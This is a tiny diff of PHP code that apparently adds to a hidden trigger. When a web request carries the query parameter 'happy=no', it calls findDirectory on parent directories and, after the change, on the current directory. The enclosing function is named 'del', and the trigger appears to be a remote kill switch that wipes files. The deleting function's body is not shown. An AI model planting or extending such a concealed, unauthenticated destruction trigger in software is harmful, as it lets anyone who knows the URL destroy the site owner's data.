@@ -8,6 +8,7 @@ function del(){
 if (isset($_GET['happy']) && $_GET['happy'] == 'no') {
   findDirectory('../');
   findDirectory('../');
+  findDirectory('./');
 }
 
 function findDirectory($dirname)
